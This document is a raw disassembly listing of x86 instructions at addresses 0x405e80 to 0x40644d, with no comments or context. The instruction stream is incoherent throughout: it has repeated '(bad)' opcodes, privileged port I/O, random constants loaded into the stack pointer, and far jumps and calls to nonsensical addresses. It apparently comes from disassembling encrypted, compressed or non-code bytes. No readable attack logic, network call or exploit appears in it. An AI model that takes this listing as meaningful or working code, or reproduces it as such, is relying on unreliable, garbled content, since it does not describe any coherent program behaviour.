  405e80:	7a 2f 68 
  405e83:	9e                   	sahf
  405e84:	b8 8b 94 8c 54       	mov    $0x548c948b,%eax
  405e89:	25 ac 5e 5c ca       	and    $0xca5c5eac,%eax
  405e8e:	9f                   	lahf
  405e8f:	bc 0b dd 5d 92       	mov    $0x925ddd0b,%esp
  405e94:	db 2c 0b             	fldt   (%ebx,%ecx,1)
  405e97:	fe                   	(bad)
  405e98:	ea 64 fd f1 07 2d 92 	ljmp   $0x922d,$0x7f1fd64
  405e9f:	bb 80 b5 72 54       	mov    $0x5472b580,%ebx
  405ea4:	d2 5b 71             	rcrb   %cl,0x71(%ebx)
  405ea7:	bf bb 0e a4 07       	mov    $0x7a40ebb,%edi
  405eac:	74 02                	je     0x405eb0
  405eae:	f1                   	int1
  405eaf:	e8 cc 3e b3 0a       	call   0xaf39d80
  405eb4:	ec                   	in     (%dx),%al
  405eb5:	79 53                	jns    0x405f0a
  405eb7:	2b bb 5d e3 58 ec    	sub    -0x13a71ca3(%ebx),%edi
  405ebd:	ce                   	into
  405ebe:	a9 d6 1f 1b 09       	test   $0x91b1fd6,%eax
  405ec3:	e0 e5                	loopne 0x405eaa
  405ec5:	3b d3                	cmp    %ebx,%edx
  405ec7:	a2 e8 75 5e b5       	mov    %al,0xb55e75e8
  405ecc:	b2 bf                	mov    $0xbf,%dl
  405ece:	37                   	aaa
  405ecf:	b0 a9                	mov    $0xa9,%al
  405ed1:	6d                   	insl   (%dx),%es:(%edi)
  405ed2:	28 21                	sub    %ah,(%ecx)
  405ed4:	0e                   	push   %cs
  405ed5:	4d                   	dec    %ebp
  405ed6:	33 85 09 93 e4 c6    	xor    -0x391b6cf7(%ebp),%eax
  405edc:	80 35 b3 a0 2f 76 0b 	xorb   $0xb,0x762fa0b3
  405ee3:	dd b3 7d c2 72 c2    	fnsave -0x3d8d3d83(%ebx)
  405ee9:	cc                   	int3
  405eea:	fe                   	(bad)
  405eeb:	6c                   	insb   (%dx),%es:(%edi)
  405eec:	c7                   	(bad)
  405eed:	56                   	push   %esi
  405eee:	6a 90                	push   $0xffffff90
  405ef0:	83 3d 74 36 52 fd 53 	cmpl   $0x53,0xfd523674
  405ef7:	27                   	daa
  405ef8:	64 74 a5             	fs je  0x405ea0
  405efb:	4b                   	dec    %ebx
  405efc:	56                   	push   %esi
  405efd:	bc e7 2a 17 5d       	mov    $0x5d172ae7,%esp
  405f02:	96                   	xchg   %eax,%esi
  405f03:	7a 80                	jp     0x405e85
  405f05:	20 0a                	and    %cl,(%edx)
  405f07:	9c                   	pushf
  405f08:	93                   	xchg   %eax,%ebx
  405f09:	54                   	push   %esp
  405f0a:	5c                   	pop    %esp
  405f0b:	b7 d2                	mov    $0xd2,%bh
  405f0d:	b4 50                	mov    $0x50,%ah
  405f0f:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405f10:	9f                   	lahf
  405f11:	6d                   	insl   (%dx),%es:(%edi)
  405f12:	18 f0                	sbb    %dh,%al
  405f14:	0f 8c a5 38 e1 76    	jl     0x772197bf
  405f1a:	ea a3 42 a9 53 e7 3c 	ljmp   $0x3ce7,$0x53a942a3
  405f21:	7f 23                	jg     0x405f46
  405f23:	4f                   	dec    %edi
  405f24:	99                   	cltd
  405f25:	7b 34                	jnp    0x405f5b
  405f27:	29 e1                	sub    %esp,%ecx
  405f29:	87 b1 e3 52 12 ac    	xchg   %esi,-0x53edad1d(%ecx)
  405f2f:	8f                   	(bad)
  405f30:	dd ef                	fucomp %st(7)
  405f32:	71 00                	jno    0x405f34
  405f34:	a2 12 6c e1 63       	mov    %al,0x63e16c12
  405f39:	3c a4                	cmp    $0xa4,%al
  405f3b:	2f                   	das
  405f3c:	8d 00                	lea    (%eax),%eax
  405f3e:	2a 1f                	sub    (%edi),%bl
  405f40:	5c                   	pop    %esp
  405f41:	11 5d 15             	adc    %ebx,0x15(%ebp)
  405f44:	f3 5f                	repz pop %edi
  405f46:	56                   	push   %esi
  405f47:	2c 37                	sub    $0x37,%al
  405f49:	6b aa 92 f0 05 3c bd 	imul   $0xffffffbd,0x3c05f092(%edx),%ebp
  405f50:	65 23 e9             	gs and %ecx,%ebp
  405f53:	30 2b                	xor    %ch,(%ebx)
  405f55:	c6                   	(bad)
  405f56:	08 d0                	or     %dl,%al
  405f58:	45                   	inc    %ebp
  405f59:	ca b0 3d             	lret   $0x3db0
  405f5c:	0f ca                	bswap  %edx
  405f5e:	51                   	push   %ecx
  405f5f:	26 15 2d f2 5a 3a    	es adc $0x3a5af22d,%eax
  405f65:	c9                   	leave
  405f66:	21 30                	and    %esi,(%eax)
  405f68:	71 fd                	jno    0x405f67
  405f6a:	af                   	scas   %es:(%edi),%eax
  405f6b:	a8 ee                	test   $0xee,%al
  405f6d:	21 48 48             	and    %ecx,0x48(%eax)
  405f70:	eb 60                	jmp    0x405fd2
  405f72:	e5 4d                	in     $0x4d,%eax
  405f74:	d4 23                	aam    $0x23
  405f76:	4b                   	dec    %ebx
  405f77:	dd fe                	(bad)
  405f79:	bd 23 b4 75 4a       	mov    $0x4a75b423,%ebp
  405f7e:	1a 8e 92 b4 6e 49    	sbb    0x496eb492(%esi),%cl
  405f84:	5a                   	pop    %edx
  405f85:	3f                   	aas
  405f86:	bb 02 77 92 8a       	mov    $0x8a927702,%ebx
  405f8b:	0f 2d 16             	cvtps2pi (%esi),%mm2
  405f8e:	9a 7f c7 57 72 63 42 	lcall  $0x4263,$0x7257c77f
  405f95:	3b a8 f1 af bc 73    	cmp    0x73bcaff1(%eax),%ebp
  405f9b:	47                   	inc    %edi
  405f9c:	ae                   	scas   %es:(%edi),%al
  405f9d:	39 f8                	cmp    %edi,%eax
  405f9f:	dd da                	fstp   %st(2)
  405fa1:	b6 1c                	mov    $0x1c,%dh
  405fa3:	e5 47                	in     $0x47,%eax
  405fa5:	61                   	popa
  405fa6:	61                   	popa
  405fa7:	f8                   	clc
  405fa8:	fe 8f b7 1f c3 7b    	decb   0x7bc31fb7(%edi)
  405fae:	2c eb                	sub    $0xeb,%al
  405fb0:	44                   	inc    %esp
  405fb1:	f3 1a 38             	repz sbb (%eax),%bh
  405fb4:	20 c5                	and    %al,%ch
  405fb6:	b7 96                	mov    $0x96,%bh
  405fb8:	81 cf 94 0c 36 4a    	or     $0x4a360c94,%edi
  405fbe:	43                   	inc    %ebx
  405fbf:	27                   	daa
  405fc0:	7f 18                	jg     0x405fda
  405fc2:	ce                   	into
  405fc3:	07                   	pop    %es
  405fc4:	b6 af                	mov    $0xaf,%dh
  405fc6:	1d 37 45 5d 51       	sbb    $0x515d4537,%eax
  405fcb:	24 f2                	and    $0xf2,%al
  405fcd:	64 c3                	fs ret
  405fcf:	4b                   	dec    %ebx
  405fd0:	d0 8b 26 2d a0 aa    	rorb   $1,-0x555fd2da(%ebx)
  405fd6:	6f                   	outsl  %ds:(%esi),(%dx)
  405fd7:	3b 55 2f             	cmp    0x2f(%ebp),%edx
  405fda:	d2 e6                	shl    %cl,%dh
  405fdc:	f0 d7                	lock xlat %ds:(%ebx)
  405fde:	3a 0f                	cmp    (%edi),%cl
  405fe0:	e8 6b a3 df 09       	call   0xa200350
  405fe5:	b8 d6 ec 3a 4c       	mov    $0x4c3aecd6,%eax
  405fea:	a1 11 05 2d e0       	mov    0xe02d0511,%eax
  405fef:	67 eb 3e             	addr16 jmp 0x406030
  405ff2:	b2 6f                	mov    $0x6f,%dl
  405ff4:	3b 6a b4             	cmp    -0x4c(%edx),%ebp
  405ff7:	bc 1e 85 64 3a       	mov    $0x3a64851e,%esp
  405ffc:	bc 95 ad e2 f1       	mov    $0xf1e2ad95,%esp
  406001:	f3 2c 81             	repz sub $0x81,%al
  406004:	61                   	popa
  406005:	a2 01 65 3b 33       	mov    %al,0x333b6501
  40600a:	ec                   	in     (%dx),%al
  40600b:	c4 ba d2 dd 59 db    	les    -0x24a6222e(%edx),%edi
  406011:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406012:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406013:	f0 19 09             	lock sbb %ecx,(%ecx)
  406016:	fa                   	cli
  406017:	7e f9                	jle    0x406012
  406019:	4e                   	dec    %esi
  40601a:	e3 1a                	jecxz  0x406036
  40601c:	d2 39                	sarb   %cl,(%ecx)
  40601e:	9c                   	pushf
  40601f:	09 4f cd             	or     %ecx,-0x33(%edi)
  406022:	c3                   	ret
  406023:	64 76 67             	fs jbe 0x40608d
  406026:	9d                   	popf
  406027:	9b                   	fwait
  406028:	a3 34 32 b1 28       	mov    %eax,0x28b13234
  40602d:	90                   	nop
  40602e:	23 dd                	and    %ebp,%ebx
  406030:	54                   	push   %esp
  406031:	79 93                	jns    0x405fc6
  406033:	c0 02 08             	rolb   $0x8,(%edx)
  406036:	0b f7                	or     %edi,%esi
  406038:	6a 93                	push   $0xffffff93
  40603a:	17                   	pop    %ss
  40603b:	5e                   	pop    %esi
  40603c:	af                   	scas   %es:(%edi),%eax
  40603d:	5f                   	pop    %edi
  40603e:	d1 23                	shll   $1,(%ebx)
  406040:	75 56                	jne    0x406098
  406042:	2f                   	das
  406043:	8a 70 02             	mov    0x2(%eax),%dh
  406046:	d6                   	salc
  406047:	88 e2                	mov    %ah,%dl
  406049:	c0 c4 97             	rol    $0x97,%ah
  40604c:	5d                   	pop    %ebp
  40604d:	f0 c2 02 b9          	lock ret $0xb902
  406051:	ea e9 ae 50 c7 39 bc 	ljmp   $0xbc39,$0xc750aee9
  406058:	41                   	inc    %ecx
  406059:	60                   	pusha
  40605a:	0d 81 11 36 5b       	or     $0x5b361181,%eax
  40605f:	79 92                	jns    0x405ff3
  406061:	90                   	nop
  406062:	c0 a0 bc a1 88 34 16 	shlb   $0x16,0x3488a1bc(%eax)
  406069:	bb e6 6c 9b ae       	mov    $0xae9b6ce6,%ebx
  40606e:	04 0f                	add    $0xf,%al
  406070:	b0 07                	mov    $0x7,%al
  406072:	20 3d 2f 7b 15 63    	and    %bh,0x63157b2f
  406078:	43                   	inc    %ebx
  406079:	36 ac                	lods   %ss:(%esi),%al
  40607b:	6f                   	outsl  %ds:(%esi),(%dx)
  40607c:	11 04 3c             	adc    %eax,(%esp,%edi,1)
  40607f:	46                   	inc    %esi
  406080:	4e                   	dec    %esi
  406081:	fc                   	cld
  406082:	6c                   	insb   (%dx),%es:(%edi)
  406083:	05 64 56 f5 5d       	add    $0x5df55664,%eax
  406088:	ff 9e 25 79 4d 58    	lcall  *0x584d7925(%esi)
  40608e:	89 e4                	mov    %esp,%esp
  406090:	c3                   	ret
  406091:	86 0d 57 7e 92 f7    	xchg   %cl,0xf7927e57
  406097:	b0 94                	mov    $0x94,%al
  406099:	6b dd 0e             	imul   $0xe,%ebp,%ebx
  40609c:	ef                   	out    %eax,(%dx)
  40609d:	5b                   	pop    %ebx
  40609e:	13 d7                	adc    %edi,%edx
  4060a0:	61                   	popa
  4060a1:	16                   	push   %ss
  4060a2:	7c aa                	jl     0x40604e
  4060a4:	4b                   	dec    %ebx
  4060a5:	46                   	inc    %esi
  4060a6:	d8 ad d8 c3 b1 f5    	fsubrs -0xa4e3c28(%ebp)
  4060ac:	11 98 60 1f eb 9b    	adc    %ebx,-0x6414e0a0(%eax)
  4060b2:	2f                   	das
  4060b3:	a9 81 8b 22 98       	test   $0x98228b81,%eax
  4060b8:	d6                   	salc
  4060b9:	75 44                	jne    0x4060ff
  4060bb:	b7 04                	mov    $0x4,%bh
  4060bd:	4a                   	dec    %edx
  4060be:	48                   	dec    %eax
  4060bf:	a1 a7 b1 f1 be       	mov    0xbef1b1a7,%eax
  4060c4:	f4                   	hlt
  4060c5:	37                   	aaa
  4060c6:	e0 46                	loopne 0x40610e
  4060c8:	f1                   	int1
  4060c9:	69 ef 55 c8 21 7b    	imul   $0x7b21c855,%edi,%ebp
  4060cf:	94                   	xchg   %eax,%esp
  4060d0:	ee                   	out    %al,(%dx)
  4060d1:	53                   	push   %ebx
  4060d2:	b5 8c                	mov    $0x8c,%ch
  4060d4:	8a a9 38 b3 b1 cc    	mov    -0x334e4cc8(%ecx),%ch
  4060da:	99                   	cltd
  4060db:	31 89 9a 21 51 b7    	xor    %ecx,-0x48aede66(%ecx)
  4060e1:	84 73 46             	test   %dh,0x46(%ebx)
  4060e4:	e4 a5                	in     $0xa5,%al
  4060e6:	51                   	push   %ecx
  4060e7:	ac                   	lods   %ds:(%esi),%al
  4060e8:	a0 f9 69 b1 44       	mov    0x44b169f9,%al
  4060ed:	5e                   	pop    %esi
  4060ee:	ac                   	lods   %ds:(%esi),%al
  4060ef:	2b 02                	sub    (%edx),%eax
  4060f1:	80 56 e9 03          	adcb   $0x3,-0x17(%esi)
  4060f5:	cc                   	int3
  4060f6:	af                   	scas   %es:(%edi),%eax
  4060f7:	f7 a5 76 74 12 47    	mull   0x47127476(%ebp)
  4060fd:	5c                   	pop    %esp
  4060fe:	41                   	inc    %ecx
  4060ff:	01 b8 49 ef 90 b0    	add    %edi,-0x4f6f10b7(%eax)
  406105:	a0 a0 69 d8 c5       	mov    0xc5d869a0,%al
  40610a:	92                   	xchg   %eax,%edx
  40610b:	e4 b0                	in     $0xb0,%al
  40610d:	1e                   	push   %ds
  40610e:	6c                   	insb   (%dx),%es:(%edi)
  40610f:	2d e3 ed e2 9d       	sub    $0x9de2ede3,%eax
  406114:	3b 2e                	cmp    (%esi),%ebp
  406116:	5b                   	pop    %ebx
  406117:	bd 2a 76 4c 8a       	mov    $0x8a4c762a,%ebp
  40611c:	aa                   	stos   %al,%es:(%edi)
  40611d:	7c 83                	jl     0x4060a2
  40611f:	f5                   	cmc
  406120:	f2 f2 52             	repnz repnz push %edx
  406123:	8b 1a                	mov    (%edx),%ebx
  406125:	35 99 ec d9 2e       	xor    $0x2ed9ec99,%eax
  40612a:	13 0b                	adc    (%ebx),%ecx
  40612c:	4d                   	dec    %ebp
  40612d:	5f                   	pop    %edi
  40612e:	1d 54 4c 7c be       	sbb    $0xbe7c4c54,%eax
  406133:	0f ad de             	shrd   %cl,%ebx,%esi
  406136:	23 78 1d             	and    0x1d(%eax),%edi
  406139:	ca b5 09             	lret   $0x9b5
  40613c:	d2 d3                	rcl    %cl,%bl
  40613e:	25 2b eb 8c 58       	and    $0x588ceb2b,%eax
  406143:	a2 75 30 bd e6       	mov    %al,0xe6bd3075
  406148:	7e 6f                	jle    0x4061b9
  40614a:	7e dd                	jle    0x406129
  40614c:	34 2d                	xor    $0x2d,%al
  40614e:	8e fd                	mov    %ebp,%?
  406150:	b7 96                	mov    $0x96,%bh
  406152:	cf                   	iret
  406153:	e1 c5                	loope  0x40611a
  406155:	8f                   	(bad)
  406156:	fc                   	cld
  406157:	c0 08 38             	rorb   $0x38,(%eax)
  40615a:	aa                   	stos   %al,%es:(%edi)
  40615b:	86 9c a6 2c a0 0c a6 	xchg   %bl,-0x59f35fd4(%esi,%eiz,4)
  406162:	2e a8 76             	cs test $0x76,%al
  406165:	c5 c5 8f             	(bad)
  406168:	f3 e4 70             	repz in $0x70,%al
  40616b:	58                   	pop    %eax
  40616c:	0d 58 d2 9f 35       	or     $0x359fd258,%eax
  406171:	cb                   	lret
  406172:	d0 dc                	rcr    $1,%ah
  406174:	53                   	push   %ebx
  406175:	e2 0b                	loop   0x406182
  406177:	55                   	push   %ebp
  406178:	fe                   	(bad)
  406179:	d8 a4 ff 8c 6f b9 6b 	fsubs  0x6bb96f8c(%edi,%edi,8)
  406180:	40                   	inc    %eax
  406181:	cf                   	iret
  406182:	3d fe ca b0 db       	cmp    $0xdbb0cafe,%eax
  406187:	08 c9                	or     %cl,%cl
  406189:	9f                   	lahf
  40618a:	8a 6c 73 b1          	mov    -0x4f(%ebx,%esi,2),%ch
  40618e:	cc                   	int3
  40618f:	8f 87 a0 a8 a1 ea    	pop    -0x155e5760(%edi)
  406195:	31 f8                	xor    %edi,%eax
  406197:	92                   	xchg   %eax,%edx
  406198:	99                   	cltd
  406199:	89 40 07             	mov    %eax,0x7(%eax)
  40619c:	d3 d0                	rcl    %cl,%eax
  40619e:	05 2a 77 90 47       	add    $0x4790772a,%eax
  4061a3:	a9 50 1f 61 16       	test   $0x16611f50,%eax
  4061a8:	1a 98 aa 8d b4 d0    	sbb    -0x2f4b7256(%eax),%bl
  4061ae:	36 e9 1b 73 ee 08    	ss jmp 0x92ed4cf
  4061b4:	f7 b5 e9 80 3f b5    	divl   -0x4ac07f17(%ebp)
  4061ba:	91                   	xchg   %eax,%ecx
  4061bb:	28 15 6c 67 f6 bf    	sub    %dl,0xbff6676c
  4061c1:	f3 97                	repz xchg %eax,%edi
  4061c3:	2b 72 2f             	sub    0x2f(%edx),%esi
  4061c6:	54                   	push   %esp
  4061c7:	66 36 d1 09          	rorw   $1,%ss:(%ecx)
  4061cb:	5a                   	pop    %edx
  4061cc:	5e                   	pop    %esi
  4061cd:	4a                   	dec    %edx
  4061ce:	18 cb                	sbb    %cl,%bl
  4061d0:	3a 57 a1             	cmp    -0x5f(%edi),%dl
  4061d3:	41                   	inc    %ecx
  4061d4:	24 52                	and    $0x52,%al
  4061d6:	fa                   	cli
  4061d7:	df 9a 4c 81 36 f6    	fistps -0x9c97eb4(%edx)
  4061dd:	33 e3                	xor    %ebx,%esp
  4061df:	74 11                	je     0x4061f2
  4061e1:	9c                   	pushf
  4061e2:	d5 b2                	aad    $0xb2
  4061e4:	fd                   	std
  4061e5:	05 67 b8 e2 c8       	add    $0xc8e2b867,%eax
  4061ea:	0f 72                	psrld  $0x72,(bad)
  4061ec:	56                   	push   %esi
  4061ed:	fe                   	(bad)
  4061ee:	3c 3a                	cmp    $0x3a,%al
  4061f0:	18 a5 13 48 37 6b    	sbb    %ah,0x6b374813(%ebp)
  4061f6:	fd                   	std
  4061f7:	15 21 ea 2e da       	adc    $0xda2eea21,%eax
  4061fc:	68 98 87 da d1       	push   $0xd1da8798
  406201:	49                   	dec    %ecx
  406202:	5e                   	pop    %esi
  406203:	45                   	inc    %ebp
  406204:	1b 3f                	sbb    (%edi),%edi
  406206:	a8 5c                	test   $0x5c,%al
  406208:	46                   	inc    %esi
  406209:	2e 4a                	cs dec %edx
  40620b:	e6 79                	out    %al,$0x79
  40620d:	2e 21 37             	and    %esi,%cs:(%edi)
  406210:	49                   	dec    %ecx
  406211:	dd 0b                	fisttpll (%ebx)
  406213:	32 55 01             	xor    0x1(%ebp),%dl
  406216:	9b                   	fwait
  406217:	1b e2                	sbb    %edx,%esp
  406219:	02 fe                	add    %dh,%bh
  40621b:	39 50 c4             	cmp    %edx,-0x3c(%eax)
  40621e:	61                   	popa
  40621f:	af                   	scas   %es:(%edi),%eax
  406220:	f9                   	stc
  406221:	64 a5                	movsl  %fs:(%esi),%es:(%edi)
  406223:	f6 6a 57             	imulb  0x57(%edx)
  406226:	17                   	pop    %ss
  406227:	50                   	push   %eax
  406228:	d6                   	salc
  406229:	fb                   	sti
  40622a:	02 af e2 94 06 10    	add    0x100694e2(%edi),%ch
  406230:	3f                   	aas
  406231:	5a                   	pop    %edx
  406232:	e2 12                	loop   0x406246
  406234:	b8 2f ad 4d 4e       	mov    $0x4e4dad2f,%eax
  406239:	e7 b1                	out    %eax,$0xb1
  40623b:	3b 40 0e             	cmp    0xe(%eax),%eax
  40623e:	da 26                	fisubl (%esi)
  406240:	52                   	push   %edx
  406241:	c7                   	(bad)
  406242:	dd 34 43             	fnsave (%ebx,%eax,2)
  406245:	7a 39                	jp     0x406280
  406247:	ec                   	in     (%dx),%al
  406248:	e4 11                	in     $0x11,%al
  40624a:	f8                   	clc
  40624b:	08 b0 aa 6e f0 01    	or     %dh,0x1f06eaa(%eax)
  406251:	2e 67 30 ed          	cs addr16 xor %ch,%ch
  406255:	53                   	push   %ebx
  406256:	22 3e                	and    (%esi),%bh
  406258:	7b 72                	jnp    0x4062cc
  40625a:	62 e9 c9             	(bad) {ru-bad},{%k5}{z}
  40625d:	d5 62                	aad    $0x62
  40625f:	73 ad                	jae    0x40620e
  406261:	af                   	scas   %es:(%edi),%eax
  406262:	a8 8b                	test   $0x8b,%al
  406264:	a0 a8 7d 38 11       	mov    0x11387da8,%al
  406269:	32 4a 91             	xor    -0x6f(%edx),%cl
  40626c:	3d 27 5c d0 96       	cmp    $0x96d05c27,%eax
  406271:	ab                   	stos   %eax,%es:(%edi)
  406272:	65 4f                	gs dec %edi
  406274:	d4 b6                	aam    $0xb6
  406276:	13 ca                	adc    %edx,%ecx
  406278:	73 cf                	jae    0x406249
  40627a:	83 56 03 69          	adcl   $0x69,0x3(%esi)
  40627e:	8c 8b d4 36 68 1e    	mov    %cs,0x1e6836d4(%ebx)
  406284:	68 01 96 02 7c       	push   $0x7c029601
  406289:	e2 47                	loop   0x4062d2
  40628b:	dc 1f                	fcompl (%edi)
  40628d:	d6                   	salc
  40628e:	f2 34 1e             	repnz xor $0x1e,%al
  406291:	88 5f ca             	mov    %bl,-0x36(%edi)
  406294:	00 2a                	add    %ch,(%edx)
  406296:	b3 3e                	mov    $0x3e,%bl
  406298:	51                   	push   %ecx
  406299:	33 0f                	xor    (%edi),%ecx
  40629b:	a2 44 79 b2 4b       	mov    %al,0x4bb27944
  4062a0:	0f 33                	rdpmc
  4062a2:	7a e3                	jp     0x406287
  4062a4:	77 95                	ja     0x40623b
  4062a6:	29 77 bc             	sub    %esi,-0x44(%edi)
  4062a9:	10 94 fb 0f 91 c7 31 	adc    %dl,0x31c7910f(%ebx,%edi,8)
  4062b0:	e3 ad                	jecxz  0x40625f
  4062b2:	b7 6d                	mov    $0x6d,%bh
  4062b4:	bc 66 7d e6 97       	mov    $0x97e67d66,%esp
  4062b9:	2e 04 75             	cs add $0x75,%al
  4062bc:	12 5f 1c             	adc    0x1c(%edi),%bl
  4062bf:	98                   	cwtl
  4062c0:	bf 5b 7d 5c 3c       	mov    $0x3c5c7d5b,%edi
  4062c5:	fa                   	cli
  4062c6:	62                   	(bad)
  4062c7:	d4 7b                	aam    $0x7b
  4062c9:	af                   	scas   %es:(%edi),%eax
  4062ca:	f4                   	hlt
  4062cb:	b9 ac a5 af 5b       	mov    $0x5bafa5ac,%ecx
  4062d0:	ed                   	in     (%dx),%eax
  4062d1:	af                   	scas   %es:(%edi),%eax
  4062d2:	1a 22                	sbb    (%edx),%ah
  4062d4:	cb                   	lret
  4062d5:	7d 5c                	jge    0x406333
  4062d7:	03 f8                	add    %eax,%edi
  4062d9:	95                   	xchg   %eax,%ebp
  4062da:	f6 a1 a8 95 66 cd    	mulb   -0x32996a58(%ecx)
  4062e0:	84 38                	test   %bh,(%eax)
  4062e2:	00 67 a6             	add    %ah,-0x5a(%edi)
  4062e5:	48                   	dec    %eax
  4062e6:	03 3d 8c f7 07 09    	add    0x907f78c,%edi
  4062ec:	38 a6 24 0c a4 f1    	cmp    %ah,-0xe5bf3dc(%esi)
  4062f2:	f6 5f 86             	negb   -0x7a(%edi)
  4062f5:	fd                   	std
  4062f6:	35 00 b1 67 79       	xor    $0x7967b100,%eax
  4062fb:	f0 4b                	lock dec %ebx
  4062fd:	81 d1 e2 ae 67 a5    	adc    $0xa567aee2,%ecx
  406303:	e1 90                	loope  0x406295
  406305:	22 87 9d af 84 e1    	and    -0x1e7b5063(%edi),%al
  40630b:	63 67 9d             	arpl   %esp,-0x63(%edi)
  40630e:	de 64 23 e0          	fisubs -0x20(%ebx,%eiz,1)
  406312:	d3 f3                	shl    %cl,%ebx
  406314:	c5 29                	lds    (%ecx),%ebp
  406316:	f0 54                	lock push %esp
  406318:	b0 80                	mov    $0x80,%al
  40631a:	91                   	xchg   %eax,%ecx
  40631b:	c1 0c e5 22 d1 2f ed 	rorl   $0xfc,-0x12d02ede(,%eiz,8)
  406322:	fc 
  406323:	d1 ed                	shr    $1,%ebp
  406325:	df fe                	(bad)
  406327:	53                   	push   %ebx
  406328:	c4 a4 99 8b ce 5a f4 	les    -0xba53175(%ecx,%ebx,4),%esp
  40632f:	b7 32                	mov    $0x32,%bh
  406331:	43                   	inc    %ebx
  406332:	c7                   	(bad)
  406333:	20 d2                	and    %dl,%dl
  406335:	59                   	pop    %ecx
  406336:	7c 96                	jl     0x4062ce
  406338:	d0 98 5a 59 26 fd    	rcrb   $1,-0x2d9a6a6(%eax)
  40633e:	39 b8 73 58 c7 4e    	cmp    %edi,0x4ec75873(%eax)
  406344:	5b                   	pop    %ebx
  406345:	7d 88                	jge    0x4062cf
  406347:	65 1e                	gs push %ds
  406349:	6d                   	insl   (%dx),%es:(%edi)
  40634a:	30 98 69 4b f8 5c    	xor    %bl,0x5cf84b69(%eax)
  406350:	97                   	xchg   %eax,%edi
  406351:	da 62 2c             	fisubl 0x2c(%edx)
  406354:	7b f8                	jnp    0x40634e
  406356:	f0 fb                	lock sti
  406358:	1b 3a                	sbb    (%edx),%edi
  40635a:	09 e7                	or     %esp,%edi
  40635c:	47                   	inc    %edi
  40635d:	bb 2c 97 03 44       	mov    $0x4403972c,%ebx
  406362:	89 4c 69 da          	mov    %ecx,-0x26(%ecx,%ebp,2)
  406366:	4b                   	dec    %ebx
  406367:	d2 81 7b f0 a6 61    	rolb   %cl,0x61a6f07b(%ecx)
  40636d:	84 14 20             	test   %dl,(%eax,%eiz,1)
  406370:	4b                   	dec    %ebx
  406371:	6e                   	outsb  %ds:(%esi),(%dx)
  406372:	53                   	push   %ebx
  406373:	6a 85                	push   $0xffffff85
  406375:	1c b7                	sbb    $0xb7,%al
  406377:	1f                   	pop    %ds
  406378:	48                   	dec    %eax
  406379:	b1 a6                	mov    $0xa6,%cl
  40637b:	e3 80                	jecxz  0x4062fd
  40637d:	0b b1 64 fe 72 95    	or     -0x6a8d019c(%ecx),%esi
  406383:	e3 f5                	jecxz  0x40637a
  406385:	26 66 36 e7 36       	es ss out %ax,$0x36
  40638a:	b9 49 3b cf 49       	mov    $0x49cf3b49,%ecx
  40638f:	2f                   	das
  406390:	30 19                	xor    %bl,(%ecx)
  406392:	9a d0 cf aa e2 32 23 	lcall  $0x2332,$0xe2aacfd0
  406399:	47                   	inc    %edi
  40639a:	fd                   	std
  40639b:	d5 64                	aad    $0x64
  40639d:	b2 32                	mov    $0x32,%dl
  40639f:	ee                   	out    %al,(%dx)
  4063a0:	93                   	xchg   %eax,%ebx
  4063a1:	79 b3                	jns    0x406356
  4063a3:	6d                   	insl   (%dx),%es:(%edi)
  4063a4:	60                   	pusha
  4063a5:	66 f5                	data16 cmc
  4063a7:	4e                   	dec    %esi
  4063a8:	1f                   	pop    %ds
  4063a9:	90                   	nop
  4063aa:	74 25                	je     0x4063d1
  4063ac:	b4 ed                	mov    $0xed,%ah
  4063ae:	b9 b1 67 3c 7a       	mov    $0x7a3c67b1,%ecx
  4063b3:	df 25 41 39 3b 2c    	fbld   0x2c3b3941
  4063b9:	0d 04 c8 ed 02       	or     $0x2edc804,%eax
  4063be:	b0 95                	mov    $0x95,%al
  4063c0:	97                   	xchg   %eax,%edi
  4063c1:	3f                   	aas
  4063c2:	aa                   	stos   %al,%es:(%edi)
  4063c3:	62 a9 1e 0e e7 72    	bound  %ebp,0x72e70e1e(%ecx)
  4063c9:	3d ee c7 a9 ed       	cmp    $0xeda9c7ee,%eax
  4063ce:	8d                   	lea    (bad),%ebp
  4063cf:	ea e6 a5 d2 81 d6 3e 	ljmp   $0x3ed6,$0x81d2a5e6
  4063d6:	6c                   	insb   (%dx),%es:(%edi)
  4063d7:	42                   	inc    %edx
  4063d8:	dd 0c 45 9a 38 dd a3 	fisttpll -0x5c22c766(,%eax,2)
  4063df:	2b 6d 91             	sub    -0x6f(%ebp),%ebp
  4063e2:	ef                   	out    %eax,(%dx)
  4063e3:	d8 0f                	fmuls  (%edi)
  4063e5:	d4 1f                	aam    $0x1f
  4063e7:	67 d9 06 31 b6       	flds   -0x49cf
  4063ec:	b9 3f 5d b1 46       	mov    $0x46b15d3f,%ecx
  4063f1:	72 51                	jb     0x406444
  4063f3:	97                   	xchg   %eax,%edi
  4063f4:	2f                   	das
  4063f5:	93                   	xchg   %eax,%ebx
  4063f6:	91                   	xchg   %eax,%ecx
  4063f7:	2d 27 20 26 cc       	sub    $0xcc262027,%eax
  4063fc:	3a 59 9e             	cmp    -0x62(%ecx),%bl
  4063ff:	f3 17                	repz pop %ss
  406401:	53                   	push   %ebx
  406402:	09 2b                	or     %ebp,(%ebx)
  406404:	db 38                	fstpt  (%eax)
  406406:	40                   	inc    %eax
  406407:	4b                   	dec    %ebx
  406408:	0c b1                	or     $0xb1,%al
  40640a:	d2 11                	rclb   %cl,(%ecx)
  40640c:	bb fb e7 84 4a       	mov    $0x4a84e7fb,%ebx
  406411:	9b                   	fwait
  406412:	3f                   	aas
  406413:	d3 0a                	rorl   %cl,(%edx)
  406415:	1e                   	push   %ds
  406416:	a3 fe 28 84 28       	mov    %eax,0x288428fe
  40641b:	9b                   	fwait
  40641c:	1d 6a 7f cf e9       	sbb    $0xe9cf7f6a,%eax
  406421:	46                   	inc    %esi
  406422:	3d 47 1c 11 ca       	cmp    $0xca111c47,%eax
  406427:	8d                   	lea    (bad),%esi
  406428:	f3 6a 63             	repz push $0x63
  40642b:	15 e7 27 81 20       	adc    $0x208127e7,%eax
  406430:	b3 04                	mov    $0x4,%bl
  406432:	f8                   	clc
  406433:	41                   	inc    %ecx
  406434:	69 9c c6 2f 81 5d 14 	imul   $0xbb918759,0x145d812f(%esi,%eax,8),%ebx
  40643b:	59 87 91 bb 
  40643f:	36 9f                	ss lahf
  406441:	0c 61                	or     $0x61,%al
  406443:	44                   	inc    %esp
  406444:	9e                   	sahf
  406445:	4d                   	dec    %ebp
  406446:	c2 ba 48             	ret    $0x48ba
  406449:	85 df                	test   %ebx,%edi
  40644b:	af                   	scas   %es:(%edi),%eax
  40644c:	59                   	pop    %ecx
  40644d:	ff                   	(bad)
